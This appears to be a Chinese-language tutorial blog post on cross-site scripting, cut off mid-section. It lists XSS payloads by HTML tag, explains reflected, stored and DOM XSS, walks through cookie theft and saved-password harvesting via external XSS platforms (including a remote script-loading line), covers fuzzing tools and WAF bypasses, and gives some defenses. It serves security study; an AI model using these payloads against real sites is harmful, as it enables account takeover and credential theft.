src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1618208947784_xss%E8%B7%A8%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB.jpg" alt="1618208947784_xss跨脚本攻击.jpg"></p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><p>受JS脚本的功能决定。</p><ol><li><p><strong>挂马、挖矿</strong></p></li><li><p><strong>盗取用户Cookie。</strong></p></li><li><p>DOS（拒绝服务）客户端浏览器。</p></li><li><p><strong>钓鱼攻击</strong>，高级的钓鱼技巧。</p></li><li><p><strong>恶意篡改页面。</strong></p></li><li><p><strong>劫持用户Web行为</strong>，甚至进一步渗透内网。</p></li><li><p>爆发Web2.0<strong>蠕虫</strong>。</p></li><li><p>蠕虫式的DDoS攻击。</p></li><li><p>蠕虫式挂马攻击、<strong>植入广告，或者发送垃圾信息、刷浏量</strong>、破坏网上数据</p></li><li><p>其它安全问题</p></li></ol><h2 id="常用攻击语句"><a href="#常用攻击语句" class="headerlink" title="常用攻击语句"></a>常用攻击语句</h2><p>一般会借助HTML标签的一些触发事件来执行攻击脚本。</p><ul><li><p><strong>script标签</strong></p><p>在 HTML 页面中插入一段 JavaScript：</p><p><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></p></li><li><p><strong>img标签</strong></p><p>img标签支持 <strong>onerror</strong> 事件属性，在装载文档或图像的过程中如果发生了错误，就会触发<strong>onerror</strong>事件。利用<strong>onerror</strong>的特性来完成XSS。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>svg标签</strong></p><p>svg标签支持 <strong>onload</strong> 时间属性，页面结束加载之后触发。</p><p><code>&lt;svg onload=alert(1)&gt;</code></p></li><li><p><strong>超链接标签</strong></p><p>解析href所指链接，此处作用是发生动作时执行一段javascript代码。</p><p><code>&lt;a href=javascript:alert(1)&gt;&lt;/a&gt;</code></p></li><li><p><strong>audio标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">href</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">&quot;javascript:alert(1)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>video标签</strong></p><p><code>&lt;video src=x onerror=prompt(1);&gt;</code></p></li><li><p><strong>div标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;width:expression(alert(/1/))&quot;</span>&gt;</span>1<span class="tag">&lt;/<span class="name">div</span>&gt;</span>     ie浏览器执行</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">onmouseover</span>%<span class="attr">3d</span>&#x27;<span class="attr">alert</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>&#x27;&gt;</span>DIV&lt;%2fdiv&gt;   url编码绕过</span><br></pre></td></tr></table></figure></li><li><p><strong>math标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">math</span>&gt;</span>&lt;a/xlink:href=javascript:prompt(1)&gt;Xss</span><br><span class="line"><span class="tag">&lt;<span class="name">math</span> <span class="attr">href</span>=<span class="string">&quot;javascript:javascript:alert(1)&quot;</span>&gt;</span>Xss<span class="tag">&lt;/<span class="name">math</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>button标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onfocus</span>=<span class="string">alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br><span class="line">&lt;button/onclick=alert(1) &gt;xss<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>keygen标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;keygen/onfocus=prompt(1);&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">keygen</span> <span class="attr">onfocus</span>=<span class="string">javascript:alert(1)</span> <span class="attr">autofocus</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>object标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"></span><br><span class="line">base64</span><br><span class="line">编码：PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg    </span><br><span class="line">解码：<span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p><strong>iframe标签</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IFRAME</span> <span class="attr">width</span>%<span class="attr">3d</span>&quot;<span class="attr">420</span>&quot; <span class="attr">height</span>%<span class="attr">3d</span>&quot;<span class="attr">315</span>&quot; <span class="attr">frameborder</span>%<span class="attr">3d</span>&quot;<span class="attr">0</span>&quot; <span class="attr">onload</span>%<span class="attr">3d</span>&quot;<span class="attr">alert</span>(<span class="attr">document.cookie</span>)&quot;&gt;</span>&lt;%2fIFRAME&gt;</span><br><span class="line">&lt;iframe%2fsrc%3d&quot;data%3atext%2fhtml%3b%26Tab%3bbase64%26Tab%3b,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg%3d%3d&quot;&gt;</span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">srcdoc</span>%<span class="attr">3d</span>&#x27;%<span class="attr">26lt</span>%<span class="attr">3bbody</span> <span class="attr">onload</span>%<span class="attr">3dprompt</span>%<span class="attr">26lpar</span>%<span class="attr">3b1</span>%<span class="attr">26rpar</span>%<span class="attr">3b</span>%<span class="attr">26gt</span>%<span class="attr">3b</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><h3 id="反弹型-XSS（非持续型）"><a href="#反弹型-XSS（非持续型）" class="headerlink" title="反弹型 XSS（非持续型）"></a>反弹型 XSS（非持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php（XSS在前端执行）&#x3D;&gt; 回包</p><p>反射型 XSS 是指恶意的<u>攻击脚本包含在 <strong>URL</strong> 中</u>，<u>只有当用户主动访问了包含恶意脚本的 URL，脚本才会被成功执行</u>。反射型的攻击，<strong>攻击脚本经过后台服务器，但是不会写入网站的数据库，是一次性的攻击</strong>，所以黑客一般需要诱骗用户点击包含攻击脚本的 URL（钓鱼邮件），才能攻击成功。</p><p>比如在get请求中构造攻击语句，输出用户在该网站的cookie：</p><p><code>?name=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>（name参数为数值的话就不加引号）</p><p>该语句输出到页面的HTML就变为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; name=&quot;name&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163239269.png" alt="image-20220728163239269"></p><h3 id="存储型-XSS（持续型）"><a href="#存储型-XSS（持续型）" class="headerlink" title="存储型 XSS（持续型）"></a>存储型 XSS（持续型）</h3><p>过程：参数x&#x3D;xss 发包 &#x3D;&gt; 携带该参数执行index.php &#x3D;&gt; XSS被写入数据库 &#x3D;&gt; 他人访问页面执行index.php &#x3D;&gt; 回包（XSS在前端被执行） </p><p>存储型 XSS 则是<u>把攻击脚本提交到网站 <strong>后台数据库</strong>，只要有人访问了显示该数据内容的页面，就会被攻击</u>。存储型XSS又称持久型XSS，<strong>攻击脚本将被永久地存放在目标服务器的数据库或文件中</strong>，可能存在于一些我们信任的网站，具有很高的隐蔽性。</p><p>攻击方式：这种攻击<u>多见于论坛、博客和留言板</u>，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久地被存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在他们的浏览器中得到执行。</p><p>相对于反射型，存储型的 XSS 成功率更高。</p><p>比如，下面的网站有留言板功能，尝试在 Name框或者Message 框提交弹窗脚本输出当前 cookie，可以构造如下XSS攻击语句<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，网站在回显我的留言时XSS脚本就会在HTML中执行。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728161005216.png" alt="image-20220728161005216"></p><h3 id="DOM-型-XSS（DOM）"><a href="#DOM-型-XSS（DOM）" class="headerlink" title="DOM 型 XSS（DOM）"></a>DOM 型 XSS（DOM）</h3><p>过程：参数x&#x3D;xss 然后发包 &#x3D;&gt; 携带该参数执行本地浏览器前端代码（XSS在前端被执行） （&#x3D;&gt; index.php &#x3D;&gt; 回包）</p><ul><li><p><strong>DOM</strong></p><p>DOM全称Document Object Model，使用DOM可以使程序和脚本能够<strong>动态访问和更新文档的内容、结构及样式</strong>。根据用户在页面的操作或提交的参数，对网页进行动态更新，比如点击查看更多、在页面输入内容后立即回显在页面等。</p><p>HTML的标签都是节点，而这些节点组成了DOM的整体结构——节点树。 通过HTML DOM,树中的所有节点均可通过JavaScript进行访问。所有HTML元素(节<br>点)均可被修改，也可以创建或删除节点。HTML DOM树结构如图所示。</p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728165551769.png" alt="image-20220728165551769" style="zoom:67%;"><p>在网站页面中有许多元素，当页面到达浏览器时，浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM动态修改页面内容，从客户端获取DOM中的数据并在本地执行。</p></li><li><p><strong>DOM型XSS</strong></p><p>DOM 型 XSS 是指 <strong>基于DOM文档对象模型</strong> 的 XSS 攻击，攻击的输出点就位于 DOM 对象上，如<code>document.referer</code>、<code>document.write</code>等等，是一种特殊类型的反射型XSS。<strong>由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞<u>不需要与服务器端交互</u>，它<u>只发生在客户端处理数据的阶段</u>。</strong></p><p>攻击方式：用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本。当用户的浏览器处理这个响应时，<u>DOM对象就会处理XSS代码，在本地浏览器前端HTML执行攻击脚本，导致存在XSS漏洞</u>。</p></li><li><p><strong>举例</strong></p><p>比如下面的网站功能是选择一种语言，会以get请求接收参数default，并且在前端回显（会在HTML中用到所提交的参数）。查看页面HTML代码，发现default的值被用于以 <code>document.write</code> 的方式来写入网页，使网页显示所选的language，由此确定页面的XSS方式为DOM型。（对客户端网页进行了访问和更新）</p><p>在 URL 后直接加入攻击脚本 <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，即可实现攻击。</p><p>有时需要查看页面HTML源码，考虑闭合语法。比如当使用<code>img</code>标签进行攻击时，攻击脚本应为 <code>&gt;&lt;/option&gt;&lt;/select&gt;&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，以闭合select和option标签。</p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163628648.png" alt="image-20220728163628648"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728163440677.png" alt="image-20220728163440677"></p><ul><li><p><strong>防御</strong></p><p>比如用户输入的参数”$var”被用于如下代码，造成DOM型的XSS。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> x=<span class="string">&quot;$var&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&quot;&lt;a href=&#x27;&quot;</span>+x+<span class="string">&quot;&#x27; &gt;test&lt;/a&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为了防御这种XSS，可以采用编码的方法，在”$var” 输出到&lt;script&gt;时，应该执行一次javascriptEncode；其次，在document.write输出到HTML页面时，要分具体情况看待：如果是输出到事件或者脚本，则要再做一次javascriptEncode；如果是输出到HTML内容或者属性，则要做一次HtmlEncode，以免又被自动解码。（<strong>执行两次编码</strong>）</p><p>也就是说，从javascript输出到HTML页面，也相当于一次XSS输出的过程，需要分语境使用不同的编码函数。</p></li></ul><h2 id="XSS攻击过程"><a href="#XSS攻击过程" class="headerlink" title="XSS攻击过程"></a>XSS攻击过程</h2><ul><li><p>寻找目标网站</p><p>有注册输入栏、留言板之类的网站，能回显输入（也就是会在HTML中用到输入的参数）。</p></li><li><p>尝试提交攻击脚本，探查过滤规则，确定可行的攻击语句</p><p>可以使用自己构造的攻击语句；</p><p>也可以搜索XSS平台，借助XSS平台构造所需要功能的攻击语句。比如xsshs.cn、xss8.cc等。一般平台构造的语句中含有平台的链接，受害者执行攻击脚本中的该链接，导致XSS，然后在XSS平台可以查看到相应的执行结果。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171550607.png" alt="image-20220730171550607"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171634759.png" alt="image-20220730171634759"></p></li><li><p>查看网页元素，确定脚本执行情况</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220730171933630.png" alt="image-20220730171933630"></p><p>攻击脚本执行成功后，查看XSS平台，获取到浏览器信息，比如cookie。</p><p><img src="https://i0.hdslb.com/bfs/article/a6b01bee60a6cf7ea796d29f3d6a2e7efb2c7a84.png@831w_318h_progressive.webp" alt="img"></p></li><li><p>根据获得的信息进行进一步攻击</p><p>比如是网站的管理员执行了XSS，受到攻击，那么就能获取到管理员的cookie。</p><p>用户凭据：通过凭据可以判断对方身份信息</p><p><strong>cookie</strong>：存储本地，存活时间较长，常用于小中型网站（账号登录）</p><p><strong>session</strong>：会话，存储服务器（占用服务器资源），存活时间较短，常用于大型网站（支付）</p></li></ul><h2 id="XSS自动化工具"><a href="#XSS自动化工具" class="headerlink" title="XSS自动化工具"></a>XSS自动化工具</h2><p><strong>XSStrike</strong></p><p><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a></p><p>XSStrike <strong>主要支持反射和 DOM XSS</strong>，支持扫描；多线程爬虫；Context 分析；可配置的核心；检测和规避 WAF；老旧的 JS 库扫描；智能 payload 生成器；手工制作的 HTML &amp; JavaScript 解析器；强大的 fuzzing 引擎；盲打 XSS 支持；高效的工作流；完整的 HTTP 支持；Bruteforce payloads 支持；Payload 编码。 </p><p>XSStrike常用命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">-h, --help //显示帮助信息</span><br><span class="line">-u, --url //指定目标 URL</span><br><span class="line">--data //POST 方式提交内容</span><br><span class="line">-v, --verbose //详细输出</span><br><span class="line">-f, --file //加载自定义 paload 字典</span><br><span class="line">-t, --threads //定义线程数</span><br><span class="line">-l, --level //爬行深度</span><br><span class="line">-t, --encode //定义 payload 编码方式</span><br><span class="line">--json //将 POST 数据视为 JSON</span><br><span class="line">--path //测试 URL 路径组件</span><br><span class="line">--seeds //从文件中测试、抓取 URL</span><br><span class="line">--fuzzer //测试过滤器和 Web 应用程序防火墙。</span><br><span class="line">--update //更新</span><br><span class="line">--timeout //设置超时时间（防止cc拦截）</span><br><span class="line">--params //指定参数</span><br><span class="line">--crawl //爬行</span><br><span class="line">--proxy //使用代理</span><br><span class="line">--blind //盲测试</span><br><span class="line">--skip //跳过确认提示</span><br><span class="line">--skip-dom //跳过 DOM 扫描</span><br><span class="line">--headers //提供 HTTP 标头</span><br><span class="line">-d, --delay //设置延迟</span><br></pre></td></tr></table></figure><p>使用流程：</p><ul><li><strong>运行工具</strong></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084135009.png" alt="image-20220801084135009"></p><ul><li><p><strong>fuzzer攻击语句扫描</strong></p><p>确定网站会过滤哪些语句，哪些语句又不会被拦截。</p><p>—offline说明waf是离线的状态，这里是因为该工具为外国开发，识别不到安全狗。</p><p>—passed为没有拦截，filtered为有过滤</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084340700.png" alt="image-20220801084340700"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084529954.png" alt="image-20220801084529954"></p></li><li><p><strong>测试扫描结果</strong></p></li></ul><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801084601132.png" alt="image-20220801084601132"></p><ul><li><p><strong>选择攻击语句</strong></p><p>选择一个不会被拦截的XSS攻击语句，</p></li><li><p><strong>在浏览器中进行攻击</strong></p><p>有可能出现请求过于频繁，被网站拦截</p><p>—对于拦截，请求频繁被cc攻击拦截后，重启靶场phpStudy即可</p><p>—实际进行网站测试时，可以现在本地搭建环境，测试那些语句不会拦截在进行漏洞测试</p><p>—还有一种方法：用代理（比较麻烦）</p></li></ul><p><strong>或者直接自动攻击</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085042713.png" alt="image-20220801085042713"></p><p><strong>配合字典进行fuzz模糊测试：</strong></p><p><strong>xssfuzz在线fuzz工具</strong></p><p><a href="https://xssfuzzer.com/fuzzer.html">https://xssfuzzer.com/fuzzer.html</a></p><p>用于自动生成各种XSS攻击payload：</p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220731151629014.png" alt="image-20220731151629014" style="zoom:50%;"><p><strong>BP配合fuzzDicts进行攻击：</strong></p><p><a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085514970.png" alt="image-20220801085514970"></p><p>name参数作为变量：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085535275.png" alt="image-20220801085535275"></p><p>选择字典文件：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085627325.png" alt="image-20220801085627325"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085645342.png" alt="image-20220801085645342"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085833954.png" alt="image-20220801085833954"></p><p>不同的执行结果，返回的网页数据包长度会不同，这里数据包更大的表示XSS攻击失败：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801085929875.png" alt="image-20220801085929875"></p><p><strong>xwaf</strong></p><p><a href="http://www.freebuf.com/news/127001.html">http://www.freebuf.com/news/127001.html</a></p><p>xwaf是一个python写的waf自动绕过工具。上一个版本是bypass_waf，xwaf相比bypass_waf更智能，可无人干预,自动暴破waf。</p><h2 id="XSS防护建议"><a href="#XSS防护建议" class="headerlink" title="XSS防护建议"></a>XSS防护建议</h2><ul><li><p><strong>代码过滤</strong>（黑名单）</p><p>包括URL、查询关键字、HTTP头、POST 数据等，仅接受指定长度范围、格式适当、符合预期的内容，对其他不符合预期的内容一律进行过滤。</p></li><li><p><strong>HttpOnly</strong></p><p><a href="https://www.oschina.net/question/100267_65116">https://www.oschina.net/question/100267_65116</a></p><p>如果您在cookie中设置了HttpOnly属性，那么 <strong>通过js脚本将无法读取到cookie信息（唯一的作用）</strong>，这样能有效的防止XSS攻击，但是并不能防止xss漏洞，只能是防止cookie被盗取。</p><p>一般除了开启 httponly，还会同时将用户所提供的内容输入输出进行过滤，许多语言都有提供对HTML的过滤。</p><ul><li><p>对于PHP而言：<a href="https://www.zuimoge.com/212.html">https://www.zuimoge.com/212.html</a></p><p>可以在php.ini文件内修改<code>session.cookie_httponly=True</code>，可以在网页php代码中开启<code>ini_set(&quot;session.cookie_httponly&quot;, 1)</code>，还可以在输入输出进行关键字、大小写、特殊符号过滤等等。比如PHP的htmlentities()和htmlspecialchars()这两个函数可以把字符转换为 HTML 实体，使得攻击代码失效。ASP的Server.HTMLEncode()对一段指定的字符串应用 HTML 编码。</p></li><li><p>对于Java而言（ESAPI）：<a href="https://www.cnblogs.com/baixiansheng/p/9001522.html">https://www.cnblogs.com/baixiansheng/p/9001522.html</a></p><p>ESAPI是一个Apache开发的安全组件，首先应当配置过滤器（注意在过滤器中chain.doFilter(..)方法中的Request对象进行包装，在包装类中对请求参数进行筛选操作）。其次将过滤器注册到web.xml文件中；最后配置Request的包装类，在其中对请求信息进行过滤。</p><p>可以选择使用CSF(Content Security Policy)安全策略：CSF是一种白名单防御策略，所有不在名单内的资源都不被信任，有效的防止了通过外部的标签、脚本、JS文件等资源的入侵形式。</p></li></ul></li><li><p>WAF</p></li></ul><h2 id="HttpOnly的绕过"><a href="#HttpOnly的绕过" class="headerlink" title="HttpOnly的绕过"></a>HttpOnly的绕过</h2><ul><li><p>若浏览器未保存帐号密码</p><p>利用表单劫持，得到用户输入的账号密码，并抄送到XSS平台上去，再应用到XSS攻击中。</p><p>前提条件1：明文密码；前提条件2：XSS存在于登录框才行，比较鸡肋</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104453015.png" alt="image-20220801104453015"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104215899.png" alt="image-20220801104215899"></p></li><li><p>若浏览器保存帐号密码</p><p>浏览器读取帐号密码。根据表单配置XSS平台，然后写入XSS代码。</p><p>确定注册时的表单属性信息：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104757064.png" alt="image-20220801104757064"></p><p>在XSS平台创建一个项目，点击配置，选择获取浏览器保存的账号密码：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104653286.png" alt="image-20220801104653286"></p><p>按照网站的表单信息填写相应的属性：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801104836681.png" alt="image-20220801104836681"></p><p>配置完成后，按照XSS平台提供的攻击语句在浏览器执行攻击，比如<code>&lt;sCRiPt sRC=//xsshs.cn/9TUt&gt;&lt;/sCrIpT&gt;</code>。</p></li></ul><h2 id="常规WAF绕过思路"><a href="#常规WAF绕过思路" class="headerlink" title="常规WAF绕过思路"></a>常规WAF绕过思路</h2><p>常见WAF过滤的标签：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;  &lt;a&gt;  &lt;p&gt;  &lt;img&gt;  &lt;body&gt; &lt;button&gt;  &lt;var&gt;  &lt;div&gt;  &lt;iframe&gt;  &lt;object&gt; &lt;input&gt; </span><br><span class="line">&lt;textarea&gt;  &lt;keygen&gt; &lt;frameset&gt;  &lt;embed&gt;  &lt;svg&gt;  &lt;math&gt;  &lt;video&gt;  &lt;audio&gt; &lt;select&gt;</span><br></pre></td></tr></table></figure><h3 id="黑名单（大小写绕过）"><a href="#黑名单（大小写绕过）" class="headerlink" title="黑名单（大小写绕过）"></a>黑名单（大小写绕过）</h3><p>过滤单引号、双引号、&lt;、&gt;、on开头的单词等非法字符。</p><p>比如过滤script，但是没有考虑大小写：</p><p><code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p><h3 id="删除黑名单字段（重复数据绕过）"><a href="#删除黑名单字段（重复数据绕过）" class="headerlink" title="删除黑名单字段（重复数据绕过）"></a>删除黑名单字段（重复数据绕过）</h3><p>尝试在 <code>&lt;script&gt;</code> 中再嵌套一个 <code>&lt;script&gt;</code>绕过：</p><p><code>&lt;scr&lt;script&gt;ipt&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p><h3 id="特殊符号干扰"><a href="#特殊符号干扰" class="headerlink" title="特殊符号干扰"></a>特殊符号干扰</h3><ul><li><p>引号闭合参数，不要&gt;</p><p>如果对&lt;&gt;进行了过滤，无法使用，可以用引号闭合链接（对于来自XSS平台的含有XSS的恶意链接）。</p><p>比如<code>&lt;script src=&#39;https://xxs8.cc/xxxx&#39;</code>是有可能成功攻击的。</p></li><li><p><code>/</code>干扰</p><p><code>&lt;/img src=&quot;#&quot; onerror=&quot;javascript:alert(1)&quot;sbjkdsbfjeb#&gt;</code></p></li></ul><h3 id="标签语法替换"><a href="#标签语法替换" class="headerlink" title="标签语法替换"></a>标签语法替换</h3><p>使用代码 <code>$name = preg_replace( &#39;/&lt;(.\*)s(.\*)c(.\*)r(.\*)i(.\*)p(.\*)t/i&#39;, &#39;&#39;, $_GET[ &#39;name&#39; ] )</code>，<code>.</code>代表任意字符，<code>*</code>代表匹配前一个字符0或无限次。其中<code>preg_replace</code> 函数可以调用正则表达式，进行 script 的逐字检查，并通过 <code>/i</code> 来不区分大小写。</p><p>但是上述代码只考虑了script标签的XSS，其实 <strong>JS 脚本不仅仅可以在 <code>&lt;script&gt;</code> 标签中使用，通过 <code>&lt;img&gt;</code> 标签中 <code>onerror</code> 行为也可以调用 JS 脚本。</strong></p><p>提交 <code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>，攻击成功。</p><p>也可尝试更多其他标签，比如<code>&lt;a&gt;</code>、<code>&lt;svg&gt;</code>、<code>&lt;audio&gt;</code>等。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220728162118390.png" alt="image-20220728162118390"></p><h3 id="字符长度限制绕过"><a href="#字符长度限制绕过" class="headerlink" title="字符长度限制绕过"></a>字符长度限制绕过</h3><p>如果只是在浏览器前端进行的字符长度限制，那么要么禁用或者修改前端的相关JS脚本，要么绕过前端在 Burpsuite 中修改数据包就可以轻松绕过限制。</p><h3 id="提交方式更改"><a href="#提交方式更改" class="headerlink" title="提交方式更改"></a>提交方式更改</h3><p>get不行，换post。</p><p>比如安全狗的部分拦截仅针对URL（get）进行检测。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731151918996.png" alt="image-20220731151918996"></p><p>更换为post提交后payload成功执行：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220731152045595.png" alt="image-20220731152045595"></p><p>有时也可以选择 HTTP 头部进行注入：</p><p>Referer表示本网页的上一个URL，这里的攻击语句首先使用引号闭合语法，然后定义type为text，使得alert(1)能够显示。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092502124.png" alt="image-20220801092502124"></p><p>攻击成功，网页上出现弹框：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220801092649962.png" alt="image-20220801092649962"></p><h3 id="垃圾数据溢出"><a href="#垃圾数据溢出" class="headerlink" 